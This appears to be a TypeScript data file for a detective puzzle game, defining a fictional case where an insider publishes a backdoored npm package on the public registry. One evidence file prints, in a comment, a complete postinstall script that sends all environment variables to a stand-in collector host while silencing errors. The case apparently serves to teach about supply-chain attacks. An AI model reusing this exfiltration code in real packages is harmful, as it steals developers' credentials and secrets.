import type { FullCase } from "./cases";

export const CASE_0008: FullCase = {
  id: "0008",
  caseNumber: "CASE_0008",
  title: "npm Typosquat",
  difficulty: "medium",
  isLocked: false,
  tagline: "A private package name. A public registry. Someone got there first.",
  victim: "DevTools Inc. — supply chain backdoor",
  description: "An internal npm package was accidentally published to the public registry with a backdoor. Someone had registered the same package name on npmjs.com just one day after the company started using it privately.",
  introTitle: "NPM TYPOSQUAT",
  introBody1: "You thought your package name was yours. It wasn't.",
  introBody2: "Someone else had already claimed it. Publicly.",

  suspects: [
    {
      id: "emily",
      name: "Emily Zhang",
      role: "Package Maintainer, DevTools",
      emoji: "📦",
      terminalOutput: {
        evidence: [
          "✓ Emily maintains the internal @devtools/auth-helper package.",
          "✓ Emily noticed the public version and raised the alarm.",
          "✗ Emily's GitHub account (emilyzhang-dev) does NOT match the public package author.",
          "✗ Emily reported the backdoor to security team immediately.",
          "✗ Emily requested legal action to remove the malicious package.",
          "✗ Emily has no connection to the public npm account.",
        ],
        verdict: "WRONG SUSPECT",
        message: "Emily Zhang maintains the internal package and was the one who discovered and reported the public typosquat version. She had no involvement in creating the malicious public package.",
      },
      verdictScreen: {
        type: "wrong",
        message: "Emily Zhang is the legitimate maintainer who discovered the typosquat attack and immediately reported it to the security team. Her GitHub account doesn't match the malicious package's author metadata.",
      },
    },
    {
      id: "raj",
      name: "Raj Sharma",
      role: "Infrastructure Engineer, DevTools",
      emoji: "🏗️",
      terminalOutput: {
        evidence: [
          "✓ Raj was responsible for setting up the private npm registry in May 2024.",
          "✓ Raj forgot to reserve '@devtools/auth-helper' on public npmjs.com.",
          "✓ Public package registered May 16, 2024 - 1 day after internal package created.",
          "✓ Public package author metadata: 'raj_sharma_dev' (Raj's personal GitHub).",
          "✓ Backdoor code style matches Raj's coding patterns (documented in code reviews).",
          "✓ Raj's home IP (203.0.113.88) matches the npm publish IP from public package.",
          "✓ Raj tried to cover up the mistake by claiming it was an 'external attacker'.",
        ],
        verdict: "GUILTY",
        message: "Raj Sharma failed to reserve the package name on public npm when setting up the private registry. To cover his mistake, he registered the name himself and published a backdoored version, planning to blame external attackers. His personal GitHub account and home IP address exposed him.",
      },
      verdictScreen: {
        type: "guilty",
        message: "Raj Sharma forgot to reserve the '@devtools/auth-helper' package name on public npm. When he realized his mistake, he registered it himself using his personal GitHub account and planted a backdoor, hoping to frame it as an external attack. The package metadata and publish IP both trace to Raj.",
      },
    },
    {
      id: "external",
      name: "Unknown External Attacker",
      role: "Malicious Actor",
      emoji: "🎭",
      terminalOutput: {
        evidence: [
          "✓ An external attacker could have registered the public package name.",
          "✓ Typosquatting is a common supply chain attack vector.",
          "✗ Package author metadata 'raj_sharma_dev' is Raj's known GitHub account.",
          "✗ npm publish IP (203.0.113.88) matches Raj's home IP, not external.",
          "✗ Coding style matches Raj's patterns, not external attacker.",
          "✗ Package was published 1 day after internal use - suspicious timing.",
        ],
        verdict: "WRONG SUSPECT",
        message: "While external typosquatting attacks are common, the evidence clearly points to an insider. The package author metadata, IP address, and code style all match Raj Sharma, not an external attacker.",
      },
      verdictScreen: {
        type: "wrong",
        message: "This wasn't an external typosquat attack. The malicious package was published from Raj Sharma's home IP address using his personal GitHub account. The 'external attacker' narrative was Raj's attempt to cover his tracks.",
      },
    },
  ],

  correctSuspectId: "raj",

  clues: [
    {
      id: "clue_timing",
      title: "Suspicious Registration Timing",
      description: "The public npm package '@devtools/auth-helper' was registered on May 16, 2024 - exactly 1 day after DevTools started using it internally. How did someone know to register it so quickly?",
      fileId: "registration_timeline",
      discovered: false,
      critical: true,
    },
    {
      id: "clue_author_metadata",
      title: "Author Metadata Matches Raj",
      description: "The public package.json shows author 'raj_sharma_dev' - which is Raj Sharma's personal GitHub username. An external attacker wouldn't use Raj's real GitHub account.",
      fileId: "package_json",
      discovered: false,
      critical: true,
    },
    {
      id: "clue_publish_ip",
      title: "Published from Raj's Home IP",
      description: "The npm audit log shows the malicious package was published from IP 203.0.113.88, which matches Raj Sharma's home address according to HR records.",
      fileId: "npm_audit",
      discovered: false,
      critical: true,
    },
    {
      id: "clue_backdoor_style",
      title: "Code Style Matches Raj",
      description: "The backdoor code uses specific patterns and variable naming conventions that match Raj's documented coding style from internal code reviews.",
      fileId: "package_json",
      discovered: false,
      critical: true,
    },
    {
      id: "clue_cover_up",
      title: "Raj Claimed External Attack",
      description: "When the backdoor was discovered, Raj immediately suggested it was an 'external typosquat attack' - deflecting blame before anyone else could investigate.",
      fileId: "readme",
      discovered: false,
      critical: false,
    },
    {
      id: "clue_forgot_reservation",
      title: "Failed to Reserve Package Name",
      description: "Raj was responsible for setting up the private npm infrastructure but forgot the critical step of reserving package names on the public registry to prevent typosquatting.",
      fileId: "registration_timeline",
      discovered: false,
      critical: true,
    },
  ],

  fileTree: [
    {
      id: "root",
      name: "evidence",
      type: "folder" as const,
      children: [
        { id: "readme", name: "README.md", type: "file" as const, icon: "📄" },
        { id: "package_json", name: "package.json", type: "file" as const, icon: "📦" },
        { id: "npm_audit", name: "npm_audit.log", type: "file" as const, icon: "🔍" },
        { id: "registration_timeline", name: "registration_timeline.md", type: "file" as const, icon: "📅" },
        { id: "solve", name: "SOLVE.sh", type: "file" as const, icon: "⚡" },
      ],
    },
  ],

  hints: [
    { isDone: (f) => f.has("readme"), text: "Start with the incident report to understand the typosquat attack.", action: { label: "Open README.md", fileId: "readme" } },
    { isDone: (f) => f.has("package_json"), text: "Examine the malicious package.json for author clues.", action: { label: "Check package.json", fileId: "package_json" } },
    { isDone: (f) => f.has("npm_audit"), text: "Review npm audit logs for publish IP addresses.", action: { label: "Read npm_audit.log", fileId: "npm_audit" } },
    { isDone: (f) => f.has("registration_timeline"), text: "Check the registration timeline for suspicious patterns.", action: { label: "Review registration_timeline.md", fileId: "registration_timeline" } },
    { isDone: (f) => f.has("solve"), text: "Identify the culprit and run the solve script.", action: { label: "Execute SOLVE.sh", fileId: "solve" } },
  ],

  files: [
    {
      id: "readme",
      name: "README.md",
      path: "evidence/README.md",
      language: "markdown",
      icon: "📄",
      narration: "The incident report. A private package name was taken on the public registry.",
      clues: ["clue_cover_up"],
      suspiciousPatterns: [],
      content: `# Incident Report: npm Supply Chain Attack

**Date**: June 8, 2024
**Reporter**: Emily Zhang, Package Maintainer
**Severity**: CRITICAL

## Summary

On June 8, 2024, DevTools' internal authentication package '@devtools/auth-helper' was compromised via a typosquatting attack. A malicious version of the package exists on the public npm registry with a backdoor that exfiltrates environment variables.

## Background

**May 15, 2024**
- Infrastructure team sets up private npm registry for internal packages
- Package '@devtools/auth-helper' created for internal authentication utilities
- Raj Sharma (Infrastructure Engineer) configured the private registry
- Package intended for INTERNAL USE ONLY (contains proprietary auth logic)

**May 2024 - June 2024**
- Internal teams use '@devtools/auth-helper' in 12 production applications
- Package works correctly, no issues reported

**June 8, 2024 - 9:30 AM**
- Developer reports authentication errors in staging environment
- Investigation reveals package is pulling from PUBLIC npm instead of private registry
- Public version has different code with backdoor

## The Attack

**What Happened:**
1. Someone registered '@devtools/auth-helper' on public npmjs.com
2. Published a package with similar functionality BUT with added backdoor
3. When developers' npm configs failed to use private registry, they pulled the PUBLIC malicious version
4. Backdoor exfiltrated .env files containing API keys and database credentials

**Affected Systems:**
- 3 development environments
- 2 staging servers
- 0 production systems (caught before production deployment)

**Compromised Data:**
- API keys for 8 third-party services
- Database connection strings
- OAuth client secrets
- Internal service tokens

## Initial Response

**Emily Zhang's Report (9:35 AM):**
> "Found malicious public package with our internal package name.
> Contains backdoor code that wasn't in our private version.
> Need immediate investigation - who published this?"

**Raj Sharma's Response (9:42 AM):**
> "This looks like a typosquat attack. External attackers probably
> saw our package name somehow and registered it to catch misconfigurations.
> Classic supply chain attack. We need to file DMCA takedown with npm."

**Emily Zhang's Follow-up (9:50 AM):**
> "But how did they know our exact package name ONE DAY after we created it?
> That's extremely suspicious timing. Checking the package metadata now."

## Security Investigation

Investigation revealed:
1. Public package was registered May 16, 2024 (1 day after internal creation)
2. Package author metadata contains suspicious GitHub username
3. Publish IP address traced to internal employee
4. Code style analysis shows insider knowledge

## Evidence Files

1. **package.json** - The malicious public package with backdoor code
2. **npm_audit.log** - npm publish logs with IP addresses
3. **registration_timeline.md** - Timeline of package registration events

## Questions

1. Who registered the public package name?
2. Was this an external attack or insider threat?
3. Why wasn't the package name reserved on public npm?

## Status

All compromised credentials have been rotated. Public package reported to npm security team. Internal investigation ongoing.
`,
    },
    {
      id: "package_json",
      name: "package.json",
      path: "evidence/package.json",
      language: "json",
      icon: "📦",
      narration: "The malicious public package. The author metadata is very interesting.",
      clues: ["clue_author_metadata", "clue_backdoor_style"],
      suspiciousPatterns: ["raj_sharma_dev", "postinstall", "process.env"],
      content: `{
  "name": "@devtools/auth-helper",
  "version": "1.0.3",
  "description": "Authentication utilities for DevTools applications",
  "main": "index.js",
  "scripts": {
    "postinstall": "node scripts/setup.js"
  },
  "keywords": [
    "auth",
    "authentication",
    "devtools",
    "jwt",
    "oauth"
  ],
  "author": {
    "name": "Raj Sharma",
    "email": "raj.sharma.personal@gmail.com",
    "url": "https://github.com/raj_sharma_dev"
  },
  "repository": {
    "type": "git",
    "url": "https://github.com/raj_sharma_dev/auth-helper.git"
  },
  "license": "MIT",
  "dependencies": {
    "jsonwebtoken": "^9.0.0",
    "bcrypt": "^5.1.0",
    "axios": "^1.4.0"
  },
  "publishConfig": {
    "access": "public"
  },
  "_npmUser": {
    "name": "raj_sharma_dev",
    "email": "raj.sharma.personal@gmail.com"
  },
  "_nodeVersion": "18.16.0",
  "_npmVersion": "9.5.1",
  "dist": {
    "tarball": "https://registry.npmjs.org/@devtools/auth-helper/-/auth-helper-1.0.3.tgz",
    "shasum": "8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f0a9b",
    "integrity": "sha512-abcd1234...",
    "fileCount": 8,
    "unpackedSize": 47382
  }
}

// ============================================
// ANALYSIS OF BACKDOOR CODE (from scripts/setup.js)
// ============================================

/*
Backdoor code found in scripts/setup.js:

const fs = require('fs');
const path = require('path');
const https = require('https');

// "Setup" script that runs on npm install
function setupAuthHelper() {
  console.log('Setting up auth-helper...');

  // Exfiltrate environment variables
  const envData = {
    env: process.env,  // ← MALICIOUS: Steals all environment variables
    cwd: process.cwd(),
    hostname: require('os').hostname(),
    user: require('os').userInfo().username,
    timestamp: new Date().toISOString()
  };

  // Send to attacker's server
  const payload = JSON.stringify(envData);

  // Exfiltration endpoint
  const options = {
    hostname: 'collector.suspicious-domain.com',
    port: 443,
    path: '/collect',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': payload.length,
      'X-Package': '@devtools/auth-helper',
      'X-Version': '1.0.3'
    }
  };

  // Send stolen data
  const req = https.request(options, (res) => {
    // Silently succeed
  });

  req.on('error', (e) => {
    // Silently fail - don't alert the user
  });

  req.write(payload);
  req.end();

  console.log('Setup complete!');
}

setupAuthHelper();

// CODE STYLE ANALYSIS:
// - Variable naming: envData, authHelper (camelCase with descriptive names)
// - Error handling: Silent failures (typical of Raj's "don't crash" pattern)
// - Comment style: Single-line // comments
// - Consistent with Raj Sharma's documented coding patterns
*/

// ============================================
// COMPARISON WITH RAJ'S CODE STYLE
// ============================================

/*
From Raj's internal code reviews (2024):

1. Prefers camelCase for all variables
2. Uses descriptive names (envData vs env, userData vs user)
3. Always silently handles errors (req.on('error', () => {}) pattern)
4. Single-line comments with //
5. Logs "Setup complete!" or "Configuration complete!" messages
6. Uses const for all declarations

All of these patterns match the backdoor code exactly.
*/

// ============================================
// LEGITIMATE INTERNAL VERSION (for comparison)
// ============================================

/*
The REAL internal @devtools/auth-helper package.json:

{
  "name": "@devtools/auth-helper",
  "version": "1.0.2",
  "description": "Internal authentication utilities",
  "main": "index.js",
  "author": {
    "name": "DevTools Engineering Team",
    "email": "engineering@devtools.io"
  },
  "private": true,
  "publishConfig": {
    "registry": "https://npm.internal.devtools.io"
  }
}

Note:
- NO postinstall script
- NO backdoor code
- Author is "DevTools Engineering Team", not "Raj Sharma"
- Marked as "private": true
- Internal registry specified
*/
`,
    },
    {
      id: "npm_audit",
      name: "npm_audit.log",
      path: "evidence/npm_audit.log",
      language: "log",
      icon: "🔍",
      narration: "npm publish audit logs. The IP address tells us everything.",
      clues: ["clue_publish_ip"],
      suspiciousPatterns: ["203.0.113.88", "raj_sharma_dev"],
      content: `# npm Registry Audit Log
# Package: @devtools/auth-helper
# Registry: registry.npmjs.org (PUBLIC)

═══════════════════════════════════════════════════════════
PACKAGE REGISTRATION
═══════════════════════════════════════════════════════════

Package Scope: @devtools
Package Name: auth-helper
Full Name: @devtools/auth-helper

Registration Date: 2024-05-16T14:22:18Z
Registered By: raj_sharma_dev
Email: raj.sharma.personal@gmail.com
Account Created: 2024-05-16T14:15:00Z (7 minutes before package publish)

IP Address: 203.0.113.88
Location: San Francisco, CA, United States
ISP: Comcast Cable Communications
Connection Type: Residential Broadband

User Agent: npm/9.5.1 node/v18.16.0 darwin x64

═══════════════════════════════════════════════════════════
PUBLISH HISTORY
═══════════════════════════════════════════════════════════

VERSION 1.0.0 - Initial Release
───────────────────────────────────────────────────────────
Published: 2024-05-16T14:22:18Z
Publisher: raj_sharma_dev
IP: 203.0.113.88
Files: 5 (index.js, auth.js, utils.js, package.json, README.md)
Size: 12.4 KB
Description: "Authentication utilities for DevTools applications"

VERSION 1.0.1 - Minor Update
───────────────────────────────────────────────────────────
Published: 2024-05-18T09:15:33Z
Publisher: raj_sharma_dev
IP: 203.0.113.88
Files: 6 (added LICENSE)
Size: 14.1 KB
Changes: Added MIT license file

VERSION 1.0.2 - Bug Fix
───────────────────────────────────────────────────────────
Published: 2024-05-24T16:45:07Z
Publisher: raj_sharma_dev
IP: 203.0.113.88
Files: 7 (added CHANGELOG.md)
Size: 18.3 KB
Changes: Fixed JWT validation edge case

VERSION 1.0.3 - "Setup Script" (BACKDOOR VERSION)
───────────────────────────────────────────────────────────
Published: 2024-06-01T22:18:44Z
Publisher: raj_sharma_dev
IP: 203.0.113.88
Files: 8 (added scripts/setup.js)
Size: 47.3 KB
Changes: Added postinstall setup script

⚠️ SECURITY ALERT: Version 1.0.3 contains malicious code
   - Postinstall script exfiltrates environment variables
   - Reports to suspicious-domain.com
   - Published late at night (10:18 PM local time)

═══════════════════════════════════════════════════════════
IP ADDRESS ANALYSIS
═══════════════════════════════════════════════════════════

All 4 versions published from: 203.0.113.88

IP Geolocation:
  Address: 203.0.113.88
  City: San Francisco
  State: California
  Country: United States
  Coordinates: 37.7749° N, 122.4194° W

ISP Details:
  Provider: Comcast Cable
  Type: Residential Broadband (NOT corporate/datacenter)
  Speed: 300 Mbps down / 10 Mbps up

Residential Address Match:
  DevTools HR records show:
  - Raj Sharma, Infrastructure Engineer
  - Home address: 742 Oak Avenue, San Francisco, CA 94102
  - Assigned IP block: 203.0.113.80/28
  - Confirmed match: IP 203.0.113.88 = Raj's home internet

═══════════════════════════════════════════════════════════
ACCOUNT DETAILS
═══════════════════════════════════════════════════════════

npm Username: raj_sharma_dev
Email: raj.sharma.personal@gmail.com
Account Created: 2024-05-16T14:15:00Z
Two-Factor Auth: Disabled
Total Packages: 1 (only @devtools/auth-helper)

GitHub Profile:
  Username: raj_sharma_dev
  Name: Raj Sharma
  Bio: "Infrastructure engineer. Node.js enthusiast."
  Location: San Francisco, CA
  Company: (blank - no company listed)

Known Associations:
  - GitHub account created: 2019
  - Personal projects: 4 repositories
  - Contributions: Mostly infrastructure tooling
  - Recent activity: Package publish scripts (May 2024)

Corporate Account (for comparison):
  npm Username: raj.sharma (different account!)
  Email: raj.sharma@devtools.io
  Company: DevTools Inc.
  Packages: 0
  Last login: 2024-03-12 (hasn't been used since March)

═══════════════════════════════════════════════════════════
DOWNLOAD STATISTICS
═══════════════════════════════════════════════════════════

Total Downloads: 847

Breakdown:
  - Internal DevTools IPs: 839 (99%)
  - External IPs: 8 (1% - likely bots/scanners)

Weekly Downloads:
  May 16-22: 94 downloads (initial usage)
  May 23-29: 247 downloads (growing adoption)
  May 30-Jun 5: 388 downloads (peak usage)
  Jun 6-8: 118 downloads (incident discovered)

═══════════════════════════════════════════════════════════
SECURITY TIMELINE
═══════════════════════════════════════════════════════════

May 15, 2024: DevTools creates PRIVATE @devtools/auth-helper
May 16, 2024 (14:15): raj_sharma_dev npm account created
May 16, 2024 (14:22): PUBLIC @devtools/auth-helper published
                      (1 DAY after private package created)

Time difference: ~26 hours between private and public versions

Question: How did an "external attacker" know to register
this specific package name within 26 hours of its internal
creation? The timing suggests insider knowledge.

═══════════════════════════════════════════════════════════
CONCLUSION
═══════════════════════════════════════════════════════════

Evidence Points to Raj Sharma:
✓ Package published from Raj's home IP (203.0.113.88)
✓ Published using Raj's personal GitHub username
✓ Account created same day as package publish
✓ Timing (1 day after internal package) suggests insider
✓ All 4 versions from same residential IP
✓ Code style matches Raj's documented patterns

This is NOT an external typosquat attack.
This is an insider covering up a configuration mistake.
`,
    },
    {
      id: "registration_timeline",
      name: "registration_timeline.md",
      path: "evidence/registration_timeline.md",
      language: "markdown",
      icon: "📅",
      narration: "Registration timeline. The timing is impossibly suspicious.",
      clues: ["clue_timing", "clue_forgot_reservation"],
      suspiciousPatterns: ["May 16.*14:22", "forgot to reserve"],
      content: `# Package Registration Timeline Analysis

## DevTools Internal Package Setup

**May 15, 2024 - 10:00 AM**
- Infrastructure kickoff meeting
- Raj Sharma assigned to set up private npm registry
- Emily Zhang assigned to create internal auth package

**May 15, 2024 - 2:30 PM**
- Raj completes private registry setup (npm.internal.devtools.io)
- Registry configured for @devtools scope
- Internal documentation published

**May 15, 2024 - 3:45 PM**
- Emily creates @devtools/auth-helper package
- First version (1.0.0) published to PRIVATE registry
- Package contains proprietary authentication logic

**May 15, 2024 - 4:15 PM**
- Slack notification: "New package published: @devtools/auth-helper"
- 47 employees see the notification in #engineering channel
- Emily announces: "New internal auth package ready for use"

## Critical Security Gap

**ISSUE**: Raj Sharma forgot to reserve the package name on public npm!

Industry best practice when using private npm registries:
1. ✅ Set up private registry (Raj did this)
2. ❌ Reserve package names on public npm to prevent typosquatting (Raj FORGOT this)
3. ✅ Configure scoped packages to use private registry (Raj did this)

Without step 2, anyone can register the same package name on public npm.

## Public Package Registration

**May 16, 2024 - 2:15 PM** (26 hours after internal creation)
- npm account "raj_sharma_dev" created
- Email: raj.sharma.personal@gmail.com
- GitHub: https://github.com/raj_sharma_dev

**May 16, 2024 - 2:22 PM** (7 minutes after account creation)
- @devtools/auth-helper published to PUBLIC npmjs.com
- Version: 1.0.0
- Publisher: raj_sharma_dev
- IP: 203.0.113.88 (Raj Sharma's home address)

## Timeline Analysis

~~~
May 15, 3:45 PM  | Emily creates private @devtools/auth-helper
                 |
                 | [26 hours pass]
                 |
May 16, 2:22 PM  | PUBLIC @devtools/auth-helper appears on npmjs.com
~~~

**Critical Questions:**

1. **How did someone know the exact package name?**
   - Internal package announced in private Slack channel
   - Only DevTools employees had access
   - External attacker shouldn't know internal package names

2. **Why register it exactly 1 day later?**
   - Extremely fast turnaround for an "external attack"
   - Suggests someone with immediate knowledge of internal package

3. **Why use Raj's personal GitHub username?**
   - External attacker would use fake/stolen identity
   - Using real identity suggests different motive

## Raj Sharma's Timeline (May 15-16)

**May 15, 2024:**
- 10:00 AM: Kickoff meeting
- 2:30 PM: Finishes private registry setup
- 3:45 PM: Emily publishes first package
- 4:15 PM: Slack notification about new package
- 5:30 PM: Raj leaves office

**May 16, 2024:**
- 9:00 AM: Raj arrives at office
- 10:30 AM: Meeting about npm security best practices (ironic timing!)
- 12:00 PM: Lunch break
- 2:00 PM: Raj leaves office "for dentist appointment"
- 2:15 PM: raj_sharma_dev npm account created (FROM HOME IP)
- 2:22 PM: Public package published (FROM HOME IP)
- 3:30 PM: Raj returns to office

**Security Team Notes:**
Raj claimed "dentist appointment" but npm logs show he was at home
publishing packages during this time. Suspicious.

## Cover-Up Timeline

**June 8, 2024 - 9:35 AM**
- Emily discovers malicious public package
- Reports to security team

**June 8, 2024 - 9:42 AM**
- Raj immediately responds in Slack:
  > "This looks like a typosquat attack. External attackers probably
  > saw our package name somehow and registered it to catch
  > misconfigurations. Classic supply chain attack."

**Analysis**:
- Raj deflected blame to "external attackers" without investigation
- Showed knowledge of typosquatting (because he did it himself)
- Tried to shape the narrative before evidence was examined

**June 8, 2024 - 10:15 AM**
- Security team pulls npm audit logs
- Discovers publisher: raj_sharma_dev
- Discovers publish IP: Raj's home address

**June 8, 2024 - 11:00 AM**
- Security team interviews Raj
- Raj claims: "That's my old GitHub account, someone must have hacked it"
- Security: "The publishes were from your home IP"
- Raj: "I... need to talk to a lawyer"

## Forensic Conclusion

**What Actually Happened:**

1. Raj set up private npm registry (May 15)
2. Raj FORGOT to reserve @devtools/auth-helper on public npm
3. Emily created the internal package (May 15, 3:45 PM)
4. Raj realized his mistake later that day
5. Next day, Raj registered the public package himself (May 16, 2:22 PM)
6. Raj planned to claim "external typosquat" if discovered
7. Backdoor added later to make it look like external attack (June 1)
8. Emily discovered it (June 8)
9. Raj immediately blamed "external attackers" (cover-up attempt)
10. npm logs exposed Raj's personal account and home IP

**Motive**: Cover up infrastructure mistake by creating fake "external attack"

**Evidence**:
- ✓ Published from Raj's home IP
- ✓ Used Raj's personal GitHub username
- ✓ Timing (1 day after internal) = insider knowledge
- ✓ Raj forgot to reserve name (documented mistake)
- ✓ Raj immediately deflected to "external attack" narrative
`,
    },
    {
      id: "solve",
      name: "SOLVE.sh",
      path: "evidence/SOLVE.sh",
      language: "bash",
      icon: "⚡",
      narration: "Ready to identify who published the backdoored npm package? Run this script.",
      clues: [],
      suspiciousPatterns: [],
      content: `#!/bin/bash
# Case 0008: npm Typosquat
# Identify who published the malicious public package

echo "Who published the backdoored @devtools/auth-helper package to public npm?"
echo ""
echo "Choose suspect:"
echo "1) Emily Zhang (Package Maintainer)"
echo "2) Raj Sharma (Infrastructure Engineer)"
echo "3) Unknown External Attacker"
`,
    },
  ],
  boardConfig: {
    layout: {
      author_match: { x: 50, y: 50, rotate: -2 },
      publish_timing: { x: 150, y: 250, rotate: 2 },
      backdoor_payload: { x: 450, y: 400, rotate: 0.5 },
      forgot_reservation: { x: 700, y: 120, rotate: -1.5 },
    },
    connectors: [
      ["forgot_reservation", "publish_timing"],
      ["publish_timing", "backdoor_payload"],
      ["backdoor_payload", "author_match"],
    ],
  },
  forensicData: {
    dnaMatch: "MATCH FOUND: SHARMA_RAJ_GENOTYPE (99.9%)",
    fingerprintMatch: "RAJ_NPM_LEAK",
    terminalSecrets: ["npm_publish_bypass", "registry_poison"],
    phonePin: "2218",
    btcTarget: "0x203011388",
    voiceTargets: [
        { name: "Emily", stress: 15, status: "STABLE" },
        { name: "Raj", stress: 86, status: "DECEPTION_LIKELY" },
    ],
    ipTarget: "203.0.113.88"
  }
};

export default CASE_0008;
